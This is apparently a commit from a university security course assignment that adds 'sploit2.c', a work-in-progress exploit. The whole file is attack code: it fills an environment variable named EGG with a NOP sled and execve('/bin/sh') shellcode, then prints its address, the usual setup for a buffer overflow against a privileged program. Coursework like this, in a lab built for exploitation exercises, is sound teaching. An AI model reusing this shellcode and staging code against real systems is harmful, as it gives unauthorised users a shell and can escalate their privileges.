dcff3aeb25b30c4a953b245cca9a9c33ffde6c41
CS458_S17_1175 <sdsuo@ugster21.student.cs>
2017-05-22 11:55:48 -0400

    work in progress for sploit 2

---
+++ sploit2.c
@@ -0,0 +1,39 @@
+#include <stdlib.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFFER_SIZE            2060
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  int bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  ptr = buff;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  setenv("EGG", buff, 1);
+  printf("EGG Address: %p\n", getenv("EGG"));
+
+  exit(0);
+}
